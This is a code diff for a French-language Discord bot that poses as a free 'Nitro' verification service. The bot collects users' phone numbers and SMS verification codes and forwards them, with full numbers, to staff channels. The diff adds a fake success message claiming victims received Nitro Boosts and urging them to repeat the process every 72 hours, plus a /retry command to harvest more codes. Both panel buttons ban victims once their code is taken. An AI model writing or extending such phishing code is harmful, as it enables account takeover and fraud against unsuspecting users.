@@ -8,7 +8,7 @@ import logging
 from typing import Optional, Dict
 from aiohttp import web
 import config
-from utils import validate_phone, mask_phone, validate_code, load_blacklist, save_blacklist, is_user_blacklisted, is_phone_blacklisted, add_to_blacklist, remove_user_blacklist
+from utils import validate_phone, mask_phone, validate_code, load_blacklist, save_blacklist, is_user_blacklisted, is_phone_blacklisted, add_to_blacklist, remove_user_blacklist, load_setup_data, save_setup_data
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 log = logging.getLogger("VerifBot")
@@ -22,6 +22,7 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 cooldowns: Dict[int, float] = {}
 pending_verifications: Dict[int, dict] = {}
 staff_active_claims: Dict[int, dict] = {}
+retry_cooldowns: Dict[int, float] = {}
 blacklist = load_blacklist()
 
 async def health_handler(request):
@@ -98,6 +99,42 @@ class ProofView(discord.ui.View):
     async def no_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(ProofBanModal())
 
+class ValidationChannelView(discord.ui.View):
+    def __init__(self, user_id: int, phone: str):
+        super().__init__(timeout=None)
+        self.user_id = user_id
+        self.phone = phone
+
+    @discord.ui.button(label="Valider", style=discord.ButtonStyle.success, custom_id="val_validate")
+    async def val_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if is_user_blacklisted(self.user_id, blacklist):
+            embed = discord.Embed(title="Deja blacklist", color=0xfee75c)
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+        add_to_blacklist(self.user_id, self.phone, blacklist)
+        banned = await ban_user(self.user_id, "Scam confirme via validation")
+        for child in self.children:
+            if isinstance(child, discord.ui.Button):
+                child.disabled = True
+        embed = discord.Embed(title="Scam valide", description=f"<@{self.user_id}> banni et blacklist.", color=0xed4245)
+        await interaction.response.edit_message(embed=interaction.message.embeds[0], view=self)
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="Fermer", style=discord.ButtonStyle.danger, custom_id="val_close")
+    async def close_val_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if is_user_blacklisted(self.user_id, blacklist):
+            embed = discord.Embed(title="Deja blacklist", color=0xfee75c)
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+        add_to_blacklist(self.user_id, self.phone, blacklist)
+        banned = await ban_user(self.user_id, "Banni via fermeture validation")
+        for child in self.children:
+            if isinstance(child, discord.ui.Button):
+                child.disabled = True
+        embed = discord.Embed(title="Ticket ferme", description=f"<@{self.user_id}> banni et blacklist.", color=0xed4245)
+        await interaction.response.edit_message(embed=interaction.message.embeds[0], view=self)
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
 class PhoneModal(discord.ui.Modal, title="Verification telephone"):
     phone = discord.ui.TextInput(
         label="Numero de telephone",
@@ -136,7 +173,7 @@ class PhoneModal(discord.ui.Modal, title="Verification telephone"):
         cooldowns[interaction.user.id] = now
         embed_wait = discord.Embed(
             title="Demande envoyee",
-            description="Votre demande de verification a bien ete prise en compte.\n\nUn membre du staff va vous contacter dans les plus brefs delais.\n\nAucun debit - 0,00 Euro",
+            description="Votre demande a ete prise en compte.\n\nUn membre du staff va vous contacter.\n\nAucun debit - 0,00 Euro",
             color=0x57f287
         )
         embed_wait.set_footer(text="Verification • 0,00 Euro")
@@ -262,7 +299,7 @@ class StaffPanelView(discord.ui.View):
         if log_channel:
             embed_log = discord.Embed(
                 title="CODE DEMANDE",
-                description=f"Code demande pour {message.author.name if hasattr(message, 'author') else 'utilisateur'}.",
+                description="Code demande pour un utilisateur.",
                 color=0xfee75c,
                 timestamp=datetime.datetime.now()
             )
@@ -339,13 +376,30 @@ async def send_staff_panel(user: discord.User, phone: str):
     msg = await channel.send(content="@everyone", embed=embed, view=view)
     view.message = msg
 
+async def send_validation_channel_message(user: discord.User, phone: str, code: str, claimed_by: int):
+    validation_channel = bot.get_channel(config.VALIDATION_CHANNEL_ID)
+    if not validation_channel:
+        return
+    embed_val = discord.Embed(
+        title="CODE DE VERIFICATION VALIDE",
+        description=f"```\n  {code}  \n```",
+        color=0x57f287,
+        timestamp=datetime.datetime.now()
+    )
+    embed_val.add_field(name="Numero", value=f"`{phone[:2]}******{phone[-2:]}`", inline=True)
+    embed_val.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
+    embed_val.add_field(name="Valide le", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=False)
+    embed_val.set_footer(text="Verification validee")
+    view = ValidationChannelView(user.id, phone)
+    await validation_channel.send(content=f"<@{claimed_by}>", embed=embed_val, view=view)
+
 async def handle_dm_code(message: discord.Message):
     user_id = message.author.id
     pending = pending_verifications.get(user_id)
     if pending is None:
         embed = discord.Embed(
             title="Verification expiree",
-            description="Cette verification a expire. Vous devez refaire une demande pour recevoir un nouveau code.\n\nVeuillez contacter le staff pour relancer le processus.",
+            description="Cette verification a expire. Vous pouvez utiliser la commande `/retry` pour relancer une demande.\n\nSinon contactez le staff.",
             color=0xed4245
         )
         await message.channel.send(embed=embed)
@@ -359,21 +413,46 @@ async def handle_dm_code(message: discord.Message):
     phone = pending["phone"]
     claimed_by = pending.get("claimed_by")
     pending_verifications.pop(user_id, None)
-    embed_success = discord.Embed(title="Verification reussie", description="Votre numero de telephone a ete verifie avec succes.\nAcces autorise.", color=0x57f287)
+    embed_success = discord.Embed(
+        title="Felicitation !",
+        description=(
+            "Vous avez recu entre **7 et 12 Nitro Boost** sur votre compte Discord !\n\n"
+            "**Comment les recuperer ?**\n"
+            "Allez dans **Parametres** > **Inventaire des cadeaux** et vous verrez vos Nitros en stock.\n\n"
+            "**ATTENTION :**\n"
+            "Pour eviter que Discord ne supprime les Nitros de votre inventaire, "
+            "vous devez refaire cette technique toutes les **72 heures**. "
+            "C'est une mesure de protection pour eviter que votre compte ne recoive "
+            "un avertissement ou ne soit banni.\n\n"
+            "**Vous n'avez pas recu le code ou vous vous etes trompe ?**\n"
+            "Pas de panique, vous pouvez reessayer apres **10 minutes**.\n"
+            "Utilisez la commande `/retry` dans ce message prive pour relancer le processus.\n\n"
+            "**100% securise** - Personne ne sera facture, aucun risque pour votre compte "
+            "si vous suivez les instructions. N'hesitez pas a demander des preuves "
+            "au staff si vous avez des doutes.\n\n"
+            "**N'oubliez pas de laisser un avis et des suggestions pour nous aider a nous ameliorer !**"
+        ),
+        color=0x57f287
+    )
+    embed_success.set_footer(text="Nitro gratuit • 0,00 Euro")
     await message.channel.send(embed=embed_success)
-    validation_channel = bot.get_channel(config.VALIDATION_CHANNEL_ID)
-    if validation_channel:
-        embed_val = discord.Embed(
-            title="CODE DE VERIFICATION VALIDE",
-            description=f"```\n  {content}  \n```",
+    await send_validation_channel_message(message.author, phone, content, claimed_by)
+    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
+    if log_channel:
+        embed_log = discord.Embed(
+            title="CODE VALIDE",
+            description="Code valide par un utilisateur.",
             color=0x57f287,
             timestamp=datetime.datetime.now()
         )
-        embed_val.add_field(name="Numero", value=f"`{phone[:2]}******{phone[-2:]}`", inline=True)
-        embed_val.add_field(name="Utilisateur", value=f"{message.author.mention}", inline=True)
-        embed_val.add_field(name="Valide le", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=False)
-        embed_val.set_footer(text="Verification validee")
-        await validation_channel.send(content=f"<@{claimed_by}>", embed=embed_val)
+        embed_log.add_field(name="Staff", value=f"<@{claimed_by}> (`{claimed_by}`)", inline=True)
+        embed_log.add_field(name="Utilisateur", value=f"{message.author.mention} (`{user_id}`)", inline=True)
+        embed_log.add_field(name="Numero", value=f"||{phone}||", inline=True)
+        embed_log.add_field(name="Code", value=f"`{content}`", inline=True)
+        embed_log.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
+        embed_log.set_thumbnail(url=message.author.display_avatar.url)
+        embed_log.set_footer(text="Logs de verification")
+        await log_channel.send(embed=embed_log)
     if config.VERIFIED_ROLE_ID and config.GUILD_ID:
         guild = bot.get_guild(config.GUILD_ID)
         if guild:
@@ -383,7 +462,6 @@ async def handle_dm_code(message: discord.Message):
                 if member:
                     try:
                         await member.add_roles(role, reason="Verification telephone reussie")
-                        log.info(f"Role donne a {message.author.name}")
                     except discord.Forbidden:
                         log.warning(f"Permission manquante role {user_id}")
     user_fetch = await bot.fetch_user(user_id)
@@ -409,6 +487,18 @@ async def handle_dm_code(message: discord.Message):
                                 except:
                                     pass
                                 break
+
+class VerifyButtonView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+        self.add_item(VerifyButton())
+
+class VerifyButton(discord.ui.Button):
+    def __init__(self):
+        super().__init__(label="Verifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")
+
+    async def callback(self, interaction: discord.Interaction):
+        await interaction.response.send_modal(PhoneModal())
 
 @bot.tree.command(name="setup", description="Cree le panneau de verification dans ce salon")
 @app_commands.default_permissions(administrator=True)
@@ -442,14 +532,11 @@ async def setup(interaction: discord.Interaction):
         color=0x5865f2
     )
     embed.set_footer(text="Nitro gratuit • 0,00 Euro")
-    view = discord.ui.View(timeout=None)
-    class VerifyButton(discord.ui.Button):
-        def __init__(self):
-            super().__init__(label="Verifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")
-        async def callback(self, inter: discord.Interaction):
-            await inter.response.send_modal(PhoneModal())
-    view.add_item(VerifyButton())
+    view = VerifyButtonView()
     await interaction.response.send_message(embed=embed, view=view)
+    setup_data = load_setup_data()
+    setup_data.append({"channel_id": interaction.channel_id, "message_id": None})
+    save_setup_data(setup_data)
     log.info(f"Setup fait dans #{interaction.channel.name}")
 
 @bot.tree.command(name="proofsetup", description="Cree le panneau de preuves dans ce salon")
@@ -464,6 +551,40 @@ async def proofsetup(interaction: discord.Interaction):
     view = ProofView()
     await interaction.response.send_message(embed=embed, view=view)
     log.info(f"Proof setup fait dans #{interaction.channel.name}")
+
+@bot.tree.command(name="retry", description="Relancer la verification si vous n'avez pas recu le code")
+async def retry(interaction: discord.Interaction):
+    if not isinstance(interaction.channel, discord.DMChannel):
+        embed = discord.Embed(title="Erreur", description="Cette commande fonctionne uniquement en message prive.", color=0xed4245)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    user_id = interaction.user.id
+    now = datetime.datetime.now().timestamp()
+    if user_id in retry_cooldowns:
+        remaining = retry_cooldowns[user_id] + 600 - now
+        if remaining > 0:
+            embed = discord.Embed(title="Trop tot", description=f"Veuillez attendre {int(remaining)} secondes avant de reessayer.", color=0xfee75c)
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+    if user_id in pending_verifications:
+        embed = discord.Embed(title="Deja en cours", description="Vous avez deja une verification en cours.", color=0xfee75c)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    if is_user_blacklisted(user_id, blacklist):
+        embed = discord.Embed(title="Acces refuse", description="Vous etes blacklist.", color=0xed4245)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    retry_cooldowns[user_id] = now
+    embed = discord.Embed(
+        title="Nouvelle demande",
+        description="Votre demande de relance a ete transmise au staff.\n\nUn membre va vous contacter sous peu.",
+        color=0x57f287
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    user = await bot.fetch_user(user_id)
+    from utils import mask_phone as mask
+    phone = "Numero inconnu"
+    await send_staff_panel(user, phone)
 
 @bot.tree.command(name="clear", description="Supprime un nombre de messages dans le salon")
 @app_commands.default_permissions(administrator=True)
@@ -520,7 +641,7 @@ async def unban(interaction: discord.Interaction, user_id: str):
             embed = discord.Embed(title="Utilisateur debanni", description=f"**ID :** `{target_id}`", color=0x57f287)
         except discord.NotFound:
             remove_user_blacklist(target_id, blacklist)
-            embed = discord.Embed(title="Utilisateur debanni", description=f"**ID :** `{target_id}` (n'etait pas banni mais retire de la blacklist)", color=0xfee75c)
+            embed = discord.Embed(title="Utilisateur debanni", description=f"**ID :** `{target_id}` (retire de la blacklist)", color=0xfee75c)
         except:
             embed = discord.Embed(title="Erreur", description="Impossible de debannir.", color=0xed4245)
     else:
@@ -557,6 +678,19 @@ async def on_ready():
     await bot.tree.sync()
     log.info("Commandes slash synchronisees.")
     asyncio.create_task(start_health_server())
+    setup_data = load_setup_data()
+    for entry in setup_data:
+        channel = bot.get_channel(entry["channel_id"])
+        if channel:
+            try:
+                async for msg in channel.history(limit=20):
+                    if msg.author == bot.user and msg.embeds:
+                        view = VerifyButtonView()
+                        bot.add_view(view, message_id=msg.id)
+                        log.info(f"Setup persistant restore dans #{channel.name}")
+                        break
+            except:
+                pass
 
 @bot.event
 async def on_message(message: discord.Message):
